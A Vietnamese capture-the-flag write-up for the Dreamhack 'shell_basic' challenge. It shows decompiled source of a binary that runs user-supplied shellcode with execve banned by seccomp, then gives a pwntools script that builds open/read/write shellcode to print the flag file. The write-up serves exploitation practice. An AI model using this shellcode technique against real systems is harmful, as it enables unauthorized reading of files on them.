# Shell_craft (tool tự dộng viết shellcode :Đ)
## 1. Chall Thử
### 1.1. Source.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+10h] [rbp-10h]

  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  init(0LL);
  banned_execve(0LL);
  printf("shellcode: ");
  read(0, buf, 0x1000uLL);
  return ((__int64 (__fastcall *)(_QWORD))buf)(0LL);
}

__int64 banned_execve()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = seccomp_init(2147418112LL);
  if ( !v1 )
    exit(0);
  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
  return seccomp_load(v1);
}
```
### 1.2. Hướng giải.
- Bắt đầu 1 bài shellcode thì ta cần check `ROPgadget` trước xem ta có thể khai thác theo hướng này đc không.
![1701454352143](image/shell_basic(learn_new_tools)/1701454352143.png)

![1701454409153](image/shell_basic(learn_new_tools)/1701454409153.png)

![1701454428289](image/shell_basic(learn_new_tools)/1701454428289.png)

- Đề bài trên `dreamhack.io` cũng phân định rõ luôn là ta sẽ ko thể nào gọi các lệnh thực thi như `execve` hay `execveat` , cũng như là sa khi check `ROPgadget` cũng chả thấy `syscall` đâu. Và chall cũng cho ta 1 đường dẫn để có thể lấy được `flag`. Thế nên ta sẽ xài đến `shellcraft`.
- Ta có thể sử dụng `shellcraft` khi mà chương trình ko cho phép sử dụng lệnh thực thi cũng như `syscall` , và `shellcraft` cũng có thể vừa viết `shell_/bin/sh` bằng lệnh `shellcraft.sh()` hay các `seccomp custom` như `shellcraft.read(agr1,agr2,agr3)`, `shellcraft.open(file)` chẳng hạn,  thế nên ta sẽ tận dụng `shellcraft` để `open()`, `read()` và `write()` truy cập vào đường dẫn đã cho và in ra flag thuiiii :>> .
![1701455137147](image/shell_basic(learn_new_tools)/1701455137147.png)
- Về cơ bản thì source cơ bản sẽ như này , ở `shellcraft.read()` arg1 mình có thể để là 0x0 cũng được nhưng ta phải thao tác thêm tham số bên ngoài thế nên ta vứt đại rax vào cho nhẹ người :)) .
- Ngoài ra ta phải định dạng kiến trúc hợp ngữ asm là amd64 trong script.
![1701455303441](image/shell_basic(learn_new_tools)/1701455303441.png)
- Chạy thử script thì ta đã thu đc flag gòi :Đ .
![1701455333722](image/shell_basic(learn_new_tools)/1701455333722.png)
## 2. Script.
```
#!/usr/bin/python3

from pwn import *

exe = ELF('shell_basic', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe
context.arch = "amd64"

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('host3.dreamhack.games', 8213)
else:
        p = process(exe.path)

GDB()
io = '/home/shell_basic/flag_name_is_loooooong'

shellcode = shellcraft.open(io)
shellcode += shellcraft.read('rax','rsp',0x80)
shellcode += shellcraft.write(1,'rsp', 0x80)    
    
payload = asm(shellcode)

p.sendafter(b'shellcode: ',payload)

p.interactive()
```
